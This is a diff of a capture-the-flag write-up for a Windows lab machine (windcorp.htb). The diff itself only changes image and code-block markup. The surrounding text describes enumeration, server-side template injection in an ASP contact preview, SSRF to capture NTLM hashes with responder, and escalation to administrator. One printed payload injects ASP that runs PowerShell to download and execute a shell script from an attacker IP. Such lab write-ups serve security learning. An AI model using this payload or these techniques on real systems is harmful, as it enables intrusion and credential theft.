@@ -22,13 +22,11 @@ PORT      STATE SERVICE
 
 `crackmapexec` can be used to enumerate domain name.
 
-{% code overflow="wrap" %}
 ```
 $ crackmapexec smb 10.129.190.189                                       
 [*] completed: 100.00% (1/1)
 SMB         10.129.190.189  445    EARTH            [*] Windows 10.0 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
 ```
-{% endcode %}
 
 Visiting `windcorp.htb` does not show anything though. In this case, we can do a sub-domain enumeration and find something.
 
@@ -45,11 +43,11 @@ ID           Response   Lines    Word       Chars       Payload
 
 Add the domains to the `/etc/hosts` file, and `www` is visited it shows a typical corporate page:
 
-<figure><img src="../../../.gitbook/assets/image (707).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(707).png>)
 
 When we fill in the Contact and try to submit, it let's us preview our submission at `preview.asp`.
 
-<figure><img src="../../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1082).png>)
 
 Here's the HTTP request for the `Send` function, which is a GET request to `save.asp`:
 
@@ -73,23 +71,21 @@ Te: trailers
 
 Interesting. Since this is using `asp`, and the output is printed on another screen, we can test some SSTI. I used this payload:
 
-<figure><img src="../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(354).png>)
 
 And this was returned:
 
-<figure><img src="../../../.gitbook/assets/image (3174).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3174).png>)
 
 This confirms that SSTI is possible on this machine, and that we can use this to gain a reverse shell (if there's no AMSI / AppLocker).
 
-{% code overflow="wrap" %}
 ```
 <%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/shell.ps1')").StdOut.ReadAll() %>
 ```
-{% endcode %}
 
 Using this, we can get a reverse shell easily.
 
-<figure><img src="../../../.gitbook/assets/image (2711).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2711).png>)
 
 ## Localadmin Creds
 
@@ -218,31 +214,29 @@ chisel server -p 5555 --reverse
 
 Afterwards, we can add `softwareportal.windcorp.htb` within our `/etc/hosts` file under `172.25.80.1`, and visit it using our browser (with FoxyProxy Proxychains).
 
-<figure><img src="../../../.gitbook/assets/image (846).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(846).png>)
 
 ### VNC -> Responder Creds
 
 Within the software present on the page, we can see that there is a VNC service available.
 
-<figure><img src="../../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(884).png>)
 
 When we click on it, it would show us this page before going back to the main website. The URL also contains another IP address:
 
-{% code overflow="wrap" %}
 ```
 http://softwareportal.windcorp.htb/install.asp?client=172.20.159.137&software=VNC-Viewer-6.20.529-Windows.exe
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (2949).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2949).png>)
 
 Since VNC is like an RDP software, there might potentially be credentials beign sent in the packets, so I started `wireshark` and also changed the `client` parameter to be my IP address. When the packets are viewed, we can see a lot of failed TCP requests:
 
-<figure><img src="../../../.gitbook/assets/image (1406).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1406).png>)
 
 This occurs because port 5985 is not open on our machine. So, using this SSRF, we can start `responder` and intercept the request to retrieve any NTLM hashes, which works:
 
-<figure><img src="../../../.gitbook/assets/image (2399).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2399).png>)
 
 We can then crack this hash easily using `john`:
 
@@ -352,7 +346,7 @@ putting file Whatif.omv as \Documents\Analytics\Whatif.omv (130.9 kb/s) (average
 
 Then we just wait. After a while, we would start to get calls on our HTTP servers and get a reverse shell as the user.
 
-<figure><img src="../../../.gitbook/assets/image (1449).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1449).png>)
 
 We can then grab the user flag.
 
@@ -460,6 +454,6 @@ Thumbprint                                Subject
 
 Then, using this hash, we can easily `psexec.py` in as the administrator and grab the root flag:
 
-<figure><img src="../../../.gitbook/assets/image (2218).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2218).png>)
 
 This part was pretty hard for me, and I had to use a walkthrough because I couldn't find the right tools to use. Great machine though!
